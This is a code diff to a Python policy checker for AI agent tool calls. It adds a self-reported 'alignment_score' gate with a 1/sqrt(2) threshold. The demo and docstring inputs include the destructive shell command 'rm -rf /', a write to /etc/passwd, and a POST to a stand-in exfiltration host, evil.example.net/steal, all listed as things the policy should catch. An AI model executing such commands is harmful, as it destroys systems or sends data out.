@@ -8,14 +8,26 @@ agent reasoning and tool execution:
 
 It evaluates a proposed action against a simple policy and returns a decision
 object explaining whether the action is allowed, blocked, or should be revised.
+
+This version adds a clean 45° alignment constraint:
+
+    cos(theta) >= 1 / sqrt(1^2 + 1^2) ~= 0.7071
+
+In practice, actions may include an ``alignment_score`` in [0, 1]. If present,
+that score is checked before policy approval. Scores below the 45° threshold are
+returned as "revise" instead of "allow".
 """
 
 from __future__ import annotations
 
 from dataclasses import dataclass, field
+from math import sqrt
 from pathlib import PurePosixPath
 from typing import Any, Dict, Iterable, List, Optional
 from urllib.parse import urlparse
+
+
+FORTY_FIVE_DEGREE_THRESHOLD = 1 / sqrt(1**2 + 1**2)  # 1/sqrt(2) ~= 0.7071
 
 
 @dataclass
@@ -77,6 +89,66 @@ def _domain_allowed(domain: Optional[str], allowed_domains: Iterable[str]) -> bo
     return False
 
 
+def _coerce_alignment_score(raw_score: Any) -> Optional[float]:
+    """Parse alignment_score into a float in [0, 1], or return None."""
+    if raw_score is None:
+        return None
+    try:
+        score = float(raw_score)
+    except (TypeError, ValueError):
+        return None
+
+    if not (0.0 <= score <= 1.0):
+        return None
+    return score
+
+
+def _check_alignment(action: Dict[str, Any]) -> Optional[Decision]:
+    """
+    Enforce a 45° alignment threshold when alignment_score is present.
+
+    alignment_score:
+        Float in [0, 1], interpreted as cosine-style alignment strength.
+
+    Returns
+    -------
+    Decision | None
+        A blocking/revision decision when the score is invalid or below threshold.
+        None means the action passes the alignment layer or did not provide a score.
+    """
+    raw_score = action.get("alignment_score")
+
+    # Alignment is optional in this minimal implementation.
+    if raw_score is None:
+        return None
+
+    score = _coerce_alignment_score(raw_score)
+    if score is None:
+        return Decision(
+            allow=False,
+            reason="alignment_score must be a number between 0.0 and 1.0.",
+            action="revise",
+            details={"alignment_score": raw_score},
+        )
+
+    if score < FORTY_FIVE_DEGREE_THRESHOLD:
+        return Decision(
+            allow=False,
+            reason=(
+                "Alignment below 45° threshold: "
+                f"{score:.4f} < {FORTY_FIVE_DEGREE_THRESHOLD:.4f}"
+            ),
+            action="revise",
+            details={
+                "alignment_score": score,
+                "threshold": FORTY_FIVE_DEGREE_THRESHOLD,
+                "constraint": "cos(theta) >= 1/sqrt(1^2 + 1^2)",
+            },
+        )
+
+    return None
+
+
 DEFAULT_POLICY: Dict[str, Any] = {
     "default_action": "block",
     "rules": [
@@ -119,6 +191,10 @@ def verify_action(
     """
     Verify a proposed agent action against a policy.
 
+    The verification pipeline is:
+
+        reason -> verify alignment -> verify policy -> act
+
     Parameters
     ----------
     action:
@@ -126,6 +202,7 @@ def verify_action(
             {"tool": "file_write", "path": "/workspace/output/a.txt"}
             {"tool": "http_request", "url": "https://api.openai.com/v1/responses", "method": "POST"}
             {"tool": "shell", "command": "rm -rf /"}
+            {"tool": "http_request", "url": "https://api.openai.com", "alignment_score": 0.82}
 
     policy:
         Optional policy dictionary. If omitted, DEFAULT_POLICY is used.
@@ -152,6 +229,11 @@ def verify_action(
             action="revise",
             details={"missing_field": "tool"},
         ).to_dict()
+
+    # 45° alignment gate comes first.
+    alignment_decision = _check_alignment(action)
+    if alignment_decision is not None:
+        return alignment_decision.to_dict()
 
     for rule in policy.get("rules", []):
         if rule.get("tool") != tool:
@@ -261,7 +343,6 @@ def _evaluate_rule(action: Dict[str, Any], rule: Dict[str, Any]) -> Optional[Dec
             details={"command": action.get("command")},
         )
 
-    # Generic fallback for matched tool rules with no specialized checker.
     on_match = rule.get("on_match", "block")
     return Decision(
         allow=on_match == "allow",
@@ -274,11 +355,35 @@ def _evaluate_rule(action: Dict[str, Any], rule: Dict[str, Any]) -> Optional[Dec
 
 if __name__ == "__main__":
     demo_actions: List[Dict[str, Any]] = [
-        {"tool": "file_write", "path": "/workspace/output/report.txt", "content": "ok"},
-        {"tool": "file_write", "path": "/etc/passwd", "content": "bad idea"},
-        {"tool": "http_request", "url": "https://api.openai.com/v1/responses", "method": "POST"},
-        {"tool": "http_request", "url": "https://evil.example.net/steal", "method": "POST"},
-        {"tool": "shell", "command": "rm -rf /"},
+        {
+            "tool": "file_write",
+            "path": "/workspace/output/report.txt",
+            "content": "ok",
+            "alignment_score": 0.91,
+        },
+        {
+            "tool": "file_write",
+            "path": "/workspace/output/report.txt",
+            "content": "needs revision",
+            "alignment_score": 0.65,
+        },
+        {
+            "tool": "http_request",
+            "url": "https://api.openai.com/v1/responses",
+            "method": "POST",
+            "alignment_score": 0.81,
+        },
+        {
+            "tool": "http_request",
+            "url": "https://evil.example.net/steal",
+            "method": "POST",
+            "alignment_score": 0.95,
+        },
+        {
+            "tool": "shell",
+            "command": "rm -rf /",
+            "alignment_score": 0.99,
+        },
     ]
 
     for item in demo_actions:
